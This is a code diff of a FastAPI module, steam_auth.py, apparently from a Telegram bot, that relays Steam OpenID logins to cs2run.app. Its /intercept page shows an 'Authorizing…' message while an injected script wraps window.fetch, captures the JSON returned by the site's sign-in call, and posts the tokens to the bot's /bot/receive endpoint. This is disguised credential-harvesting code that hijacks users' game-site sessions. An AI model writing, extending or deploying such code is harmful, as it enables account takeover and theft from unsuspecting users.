@@ -1,7 +1,7 @@
 # steam_auth.py
 
 from fastapi import APIRouter, Request, Query
-from fastapi.responses import HTMLResponse, RedirectResponse, JSONResponse
+from fastapi.responses import HTMLResponse, RedirectResponse
 import urllib.parse
 import json
 
@@ -9,8 +9,9 @@ router = APIRouter()
 
 SELF_URL = "https://tg-bot-test-gkbp.onrender.com"
 
+
 # -------------------------------
-# 1️⃣ Вход → Steam
+# 1️⃣ Login → Steam
 # -------------------------------
 @router.get("/auth/login")
 async def auth_login(chat_id: int):
@@ -38,16 +39,16 @@ async def auth_callback(request: Request, chat_id: int = Query(...)):
 
     print("\n🧪 STEAM CALLBACK PARAMS:\n", steam_params, "\n")
 
-    # Страница-перехватчик
-    final_url = f"{SELF_URL}/intercept?chat_id={chat_id}"
+    # ✅ ВАЖНО: returnUrl должен быть ТОЛЬКО таким
+    final_url = "https://csgoyz.run/auth"
 
-    # Формируем редирект в cs2run
+    # В cs2run передаём ТОЛЬКО openid-параметры
     query = {
         "returnUrl": final_url,
-        **steam_params
+        **{k: v for k, v in steam_params.items() if k.startswith("openid.")}
     }
 
-    encoded = urllib.parse.urlencode(query, safe=":/?=&")
+    encoded = urllib.parse.urlencode(query, safe=":/")
 
     redirect_url = f"https://cs2run.app/auth/1/start-sign-in/?{encoded}"
 
@@ -64,9 +65,8 @@ async def intercept(chat_id: int):
     return HTMLResponse(f"""
 <!DOCTYPE html>
 <html>
-<head><title>Authorizing...</title></head>
+<head><title>Authorizing…</title></head>
 <body>
-
 <script>
 (function() {{
     const origFetch = window.fetch;
@@ -76,12 +76,11 @@ async def intercept(chat_id: int):
 
         try {{
             if (arguments[0] && arguments[0].includes('/auth/1/sign-in')) {{
-                const clone = res.clone();
-                const data = await clone.json();
+                const data = await res.clone().json();
 
                 await fetch('/bot/receive?chat_id={chat_id}', {{
                     method: 'POST',
-                    headers: {{'Content-Type': 'application/json'}},
+                    headers: {{ 'Content-Type': 'application/json' }},
                     body: JSON.stringify(data)
                 }});
             }}
@@ -94,14 +93,13 @@ async def intercept(chat_id: int):
 
 <h3>🔐 Авторизация…</h3>
 <p>Пожалуйста, подождите</p>
-
 </body>
 </html>
 """)
 
 
 # -------------------------------
-# 4️⃣ Приём токенов сервером
+# 4️⃣ Сервер принимает токены
 # -------------------------------
 @router.post("/bot/receive")
 async def receive_tokens(chat_id: int, payload: dict):
